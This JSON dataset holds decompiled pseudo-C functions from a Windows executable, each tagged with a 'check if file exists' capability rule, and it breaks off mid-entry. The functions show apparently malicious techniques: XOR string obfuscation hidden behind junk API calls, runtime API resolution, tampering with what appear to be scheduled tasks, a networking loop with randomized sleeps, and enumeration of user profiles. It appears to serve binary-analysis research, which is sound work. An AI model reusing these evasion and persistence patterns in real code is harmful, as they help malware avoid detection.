{
    "00401235": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401235(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00401277;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00401277:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.004041de();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 635
    },
    "004012fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004012fd(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00401235();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 285
    },
    "00408a3b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408a3b(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.00409936();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040e3c0(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040e446(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41dac8 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.004088c1();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.004088c1();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 541
    },
    "00408cbb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408cbb(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    ushort var_33h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t lpModuleName;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    _var_30h = 0;\n    var_1ch = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_8h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00408c72();\n    }\n    if (*0x41dd20 == NULL) {\n        var_28h = 0xf0c2326;\n        var_24h = 0x433661e;\n        var_20h._0_2_ = 0x720f;\n        var_14h = 0x63685748;\n        var_10h._0_1_ = 0x72;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_ch = &var_28h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar4 != 0xc1c0d5) {\n                var_ch = 5;\n                *(iVar6 + iVar3) = *(&var_14h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_4ch = 0x3c340709;\n        var_48h = 0x22676743;\n        var_14h = 6;\n        var_44h._0_1_ = 6;\n        stack0xffffffb9 = 0x3a075032;\n        var_3fh = 0x55261702;\n        var_3bh = 0xe151e3d;\n        var_37h = 0x6528463c;\n        var_33h = 0x6344;\n        var_24h = 0x53637053;\n        var_20h._0_2_ = 0x5134;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_ch = &var_4ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x8aefb7) {\n                *(iVar6 + iVar3) = *(&var_24h + iVar6 % var_14h) ^ (iVar6 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41dd20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_30h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_1ch;\n        if (*0x41dd20 == NULL) goto code_r0x00408e5d;\n    }\n    iVar3 = var_4h;\n    var_30h = 0;\n    iVar6 = (**0x41dd20)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_30h);\n    if (-1 < iVar6) {\n    }\ncode_r0x00408e5d:\n    if (var_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_30h;\n}\n",
        "token_count": 1195
    },
    "0040a18a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a18a(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x420b3911;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x671b7524;\n    var_28h = 0x3975486e;\n    pszFirst = 0x42673975;\n    var_4h._0_1_ = 0x48;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar6 != 0x63dba3) {\n            var_24h = 5;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 5) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411350, 0, 1, 0x411360, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x411370, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41da98);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar7 && (var_ch != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar5);\n                                    piVar3 = var_ch;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar7 - var_ch >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1430
    },
    "0040ab03": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ab03(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41dd60;\n    var_44h = 0x339370f;\n    var_40h = 0x3d09540f;\n    var_3ch = 0x5e010d33;\n    var_38h = 0x17353b03;\n    var_34h = 0x211d401b;\n    var_30h = 0x4a1d112f;\n    var_2ch = 0x4a742f17;\n    var_28h = 0x665c0335;\n    var_24h = 0x55c526e;\n    var_20h = 0x676a6c56;\n    var_14h = 0x675a556e;\n    var_10h._0_2_ = 0x326a;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar5 != 0x153e62) {\n            var_4h = 6;\n            pcVar4[iVar7] = *(&var_14h + iVar7 % 6) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = str.XCIBD__O;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040abf1;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040abf1:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.0040c58e();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x413430);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 991
    },
    "0040ad5f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ae28)\n// WARNING: Removing unreachable block (ram,0x0040ae43)\n// WARNING: Removing unreachable block (ram,0x0040ae4a)\n// WARNING: Removing unreachable block (ram,0x0040ae51)\n// WARNING: Removing unreachable block (ram,0x0040ae6a)\n\nuint __cdecl fcn.0040ad5f(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41dd14;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040512a();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41da90);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.00404d80();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040ac6c(0),  iVar2 != 0)) {\n        fcn.004052ed();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41da90);\n    }\n    while (*0x41dd5c == 0) {\n        iVar2 = fcn.0040ab03();\n        if (iVar2 != -1) {\n            fcn.0040c610();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 506
    },
    "0040bab2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040bab2(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint lpcchSize;\n    int32_t var_64h;\n    uint ARG_0;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint lpFileName;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x56234c34;\n    var_24h = 0x4c194e07;\n    var_20h = 0x4e445620;\n    var_1ch = 0x56294c2b;\n    var_18h = 0x4c0c4e10;\n    var_14h = 0x4e0a5625;\n    var_10h = 0x563f4c1f;\n    var_ch = 0x4c2c4e38;\n    var_8h = 0x4e095629;\n    var_4h = 0x564c4c08;\n    var_30h = 0x564c4c78;\n    var_2ch._0_2_ = 0x4e64;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_4ch = 6;\n    iVar6 = 0;\n    var_64h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar4 != 0x248de) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_4ch) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x520a3918;\n    var_24h = 0x391d3124;\n    var_20h = 0x3120521b;\n    var_1ch = 0x52263938;\n    var_18h = 0x39363118;\n    var_14h = 0x31355219;\n    var_10h = 0x52263935;\n    var_ch = 0x393c3100;\n    var_8h = 0x31245217;\n    var_4h = CONCAT22(var_4h._2_2_, 0x3959);\n    var_30h = 0x527a3959;\n    var_2ch._0_2_ = 0x3154;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_74h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    var_6ch = var_74h;\n    var_3ch = &var_28h - var_74h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCursor)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0x2f9b38) {\n            *(iVar3 + var_74h) = *(&var_30h + iVar3 % var_4ch) ^ (iVar3 + var_74h)[&var_28h - var_74h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_70h = var_64h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_3ch = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4117cc);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4117d0),  iVar6 != 0)) {\n                var_58h = 0;\n                var_54h = 0x6140341b;\n                var_50h._0_2_ = 0x4751;\n                var_30h = 0x616a3447;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x51);\n                var_38h = 0x4d314f7a;\n                var_34h._0_2_ = 0x5354;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_5ch = iVar3;\n                    var_48h = &var_54h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                        if (iVar4 != 0x5a416e) {\n                            var_48h = 5;\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_54h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    var_14h = 0x4d424f5f;\n                    var_10h = 0x4f5f5308;\n                    var_ch = 0x53084d42;\n                    var_8h = 0x4d424f5f;\n                    var_4h = CONCAT22(var_4h._2_2_, 0x5354);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_48h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                        if (iVar4 != 0x605fe5) {\n                            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_4ch) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_74h)[var_58h]);\n                    fcn.0040e071(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_5ch);\n                    (*pcVar1)(uVar2);\n                    var_58h = var_58h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_3ch;\n                } while (var_58h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_3ch = -1;\n            }\n        }\n    }\n    var_24h = 0x38105351;\n    var_20h = 0x5307792d;\n    var_1ch = 0x79313837;\n    var_18h = 0x38115319;\n    var_14h = 0x531b793b;\n    var_10h = 0x79713837;\n    var_ch = 0x38175328;\n    var_8h = 0x53197931;\n    var_4h = 0x79543833;\n    var_38h = 0x38435374;\n    var_34h._0_2_ = 0x7954;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_5ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0xf3a6d8) {\n            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_4ch) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040e071(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_6ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 2757
    },
    "0040bf23": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bf23(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41dd5c = 1;\n    fcn.0040d1c9(param_1);\n    fcn.0040a18a();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41da98);\n    if (iVar1 != -1) {\n        fcn.0040e360();\n    }\n    fcn.0040bab2();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040b9c3();\n    return;\n}\n",
        "token_count": 144
    },
    "0040bf6b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
